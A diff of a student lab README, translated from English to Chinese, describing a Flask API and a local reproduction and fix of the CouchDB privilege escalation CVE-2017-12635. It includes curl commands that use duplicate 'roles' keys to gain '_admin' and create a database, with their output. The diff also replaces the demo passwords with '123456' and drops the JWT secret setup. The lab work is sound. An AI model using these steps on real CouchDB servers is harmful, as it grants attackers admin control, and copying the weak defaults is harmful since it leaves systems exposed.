@@ -1,82 +1,77 @@
-# Information Security Lab 1
+# 信息安全实验一
 
-This repository contains a small Flask API and a practice environment for
-**CVE-2017-12635** (CouchDB privilege escalation).
+这个仓库是我做信息安全实验一的代码。内容包括一个简单的 Flask API，以及
+CVE-2017-12635（CouchDB 权限提升）的复现和修复。
 
-## What is inside
+## 文件说明
 
 ```text
-app.py                  Flask API
-tests/test_app.py       six simple tests
-cve/                    CVE reproduction files and the fixed CouchDB setup
-docs/screenshots/       evidence screenshots
+app.py                  后端代码
+test_api.py             测试代码
+requirements.txt        需要安装的 Python 包
+cve/                    复现用的 JSON 和修复版 CouchDB
+docs/screenshots/       实验截图
 .github/workflows/      GitHub Actions
 ```
 
-## Run the API
+## 运行方法
 
-Windows PowerShell:
+在 PowerShell 里执行：
 
 ```powershell
 py -3 -m venv .venv
 .\.venv\Scripts\Activate.ps1
-python -m pip install -r requirements-dev.txt
-$env:JWT_SECRET = "change-this-to-a-long-random-string"
+pip install -r requirements.txt
 python app.py
 ```
 
-The API runs on `http://127.0.0.1:5000`.
+程序运行在 `http://127.0.0.1:5000`。
 
-Demo users:
+数据库是 SQLite，第一次运行会自动建表，并创建两个测试用户：
 
-| User | Password | Role |
+| 用户名 | 密码 | 角色 |
 |---|---|---|
-| alice | `AlicePass123!` | admin |
-| bob | `BobPass123!` | user |
+| alice | 123456 | admin |
+| bob | 123456 | user |
 
-## API
+## 接口
 
-### Login
+### 登录
 
 ```bash
-curl -s -X POST http://127.0.0.1:5000/auth/login \
+curl -X POST http://127.0.0.1:5000/auth/login \
   -H "Content-Type: application/json" \
-  -d '{"login":"alice","password":"AlicePass123!"}'
+  -d '{"login":"alice","password":"123456"}'
 ```
 
-The response contains an `access_token`.
+返回一个 token。
 
-### Get data
+### 获取数据
 
 ```bash
-curl -s http://127.0.0.1:5000/api/data \
-  -H "Authorization: Bearer <token>"
+curl http://127.0.0.1:5000/api/data \
+  -H "Authorization: Bearer 这里填token"
 ```
 
-Without a token the server returns `401`. The optional `?q=` parameter searches
-posts.
+不带 token 会返回 401。加 `?q=关键词` 可以搜索。
 
-### Create data
+### 添加数据
 
 ```bash
-curl -s -X POST http://127.0.0.1:5000/api/data \
-  -H "Authorization: Bearer <token>" \
+curl -X POST http://127.0.0.1:5000/api/data \
+  -H "Authorization: Bearer 这里填token" \
   -H "Content-Type: application/json" \
-  -d '{"title":"Hello","body":"My first post"}'
+  -d '{"title":"标题","body":"内容"}'
 ```
 
-## Security measures
+## 安全部分
 
-- **SQL injection:** all queries use `?` placeholders, for example
-  `SELECT * FROM users WHERE username = ?`.
-- **XSS:** user text is escaped with `html.escape()` before it is returned.
-- **Passwords:** stored as bcrypt hashes, never in plaintext.
-- **Authentication:** login returns a JWT; protected routes verify the
-  `Authorization: Bearer` header with `jwt.decode(..., algorithms=["HS256"])`.
-- The API also sets `X-Content-Type-Options: nosniff` and
-  `X-Frame-Options: DENY`.
+1. 防 SQL 注入：SQL 里用 `?` 占位符，不拼接字符串。
+2. 防 XSS：返回数据前用 `html.escape()` 转义。
+3. 密码用 bcrypt 加密后存数据库，不存明文。
+4. 登录后发 JWT，访问受保护接口时要带 token。
 
-## Tests and CI
+## 测试和 CI
 
 ```text
 python -m pytest -q
@@ -90,33 +85,29 @@ python -m pip_audit -r requirements.txt
 No known vulnerabilities found
 ```
 
-GitHub Actions runs these checks on every push:
+GitHub Actions 每次 push 都会自动运行这些检查：
 
-<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39197917908>
+<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions>
 
 ## CVE-2017-12635
 
-CVE-2017-12635 is a privilege escalation bug in Apache CouchDB before 1.7.0 and
-2.x before 2.1.1. CouchDB uses an Erlang JSON parser for authorization and a
-JavaScript parser for stored documents. If a user document contains two
-`roles` keys, the two parsers can read different values. An attacker can send
-`"roles": ["_admin"]` followed by `"roles": []`, pass the admin check, and still
-store a user with the `_admin` role.
+CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。原因是 CouchDB 用了两个
+不同的 JSON 解析器：检查权限时看第一个 `roles`，保存用户时看最后一个
+`roles`。所以在请求里写两个 `roles`，就能绕过管理员检查。
 
-### Start the vulnerable version
+### 启动漏洞环境
 
 ```bash
 cd vulhub/couchdb/CVE-2017-12635
 docker compose up -d
 ```
 
-If the init container reports `$'\r': command not found`, the `init.sh` file
-has Windows line endings. Convert it to LF or set
-`git config --global core.autocrlf false` before cloning Vulhub.
+Windows 下如果 init 容器报 `$'\r': command not found`，说明 `init.sh` 是
+CRLF 换行，把它改成 LF 就行。
 
-### Reproduce
+### 复现
 
-Normal request with an admin role (rejected):
+先发一个正常的请求，会被拒绝：
 
 ```bash
 curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
@@ -124,9 +115,13 @@ curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
   --data-binary @cve/normal_user.json
 ```
 
-Expected: `403 Forbidden`, `Only _admin may set roles`.
+结果是 403：
 
-Request with duplicate `roles` keys:
+```text
+{"error":"forbidden","reason":"Only _admin may set roles"}
+```
+
+再发带两个 `roles` 的请求：
 
 ```bash
 curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
@@ -134,56 +129,43 @@ curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
   --data-binary @cve/duplicate_roles.json
 ```
 
-Expected: `201 Created`.
-
-Check the new user:
+结果是 201。然后登录：
 
 ```bash
 curl -u vulhub:vulhub http://127.0.0.1:5984/_session
 ```
 
-The response contains `"roles":["_admin"]`. The user can also create a
-database:
+可以看到 `roles` 里已经有 `_admin`：
+
+```json
+{"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
+```
+
+这个用户还可以创建数据库：
 
 ```bash
 curl -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
 ```
 
-### Fix
+返回 201，说明确实拿到了管理员权限。
 
-Use CouchDB 2.1.1:
+### 修复
+
+换成 CouchDB 2.1.1：
 
 ```bash
 docker compose -f cve/fixed/docker-compose.yml up -d
 ```
 
-The fixed instance listens on `http://127.0.0.1:5985`.
+修复版在 `http://127.0.0.1:5985`。
 
-The duplicate-role request is still accepted (`201`), but the stored document
-has `"roles":[]`. Logging in as `vulhub:vulhub` now gives an empty role list,
-and an admin-only request returns `401`.
+再发同样的重复 `roles` 请求，虽然还是返回 201，但登录后 `roles` 是空的，
+创建数据库会返回 401。普通用户注册仍然正常，说明修复没有影响正常功能。
 
-Normal registration still works:
+## 截图
 
-```bash
-curl -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser \
-  -H "Content-Type: application/json" \
-  --data-binary @cve/plain_user.json
+![漏洞复现](docs/screenshots/cve-before.png)
 
-curl -u normaluser:normalpass http://127.0.0.1:5985/_session
-```
-
-Expected: `201 Created`, then `"roles":[]`. This is the regression test: the
-fix blocks privilege escalation without breaking ordinary user creation.
-
-## Evidence
-
-![Vulnerable CouchDB](docs/screenshots/cve-before.png)
-
-![Fixed CouchDB](docs/screenshots/cve-after.png)
+![修复验证](docs/screenshots/cve-after.png)
 
 ![GitHub Actions](docs/screenshots/ci-success.png)
-
-## Repository
-
-<https://github.com/zhangyu7777777/InformationSecurity_23320309>
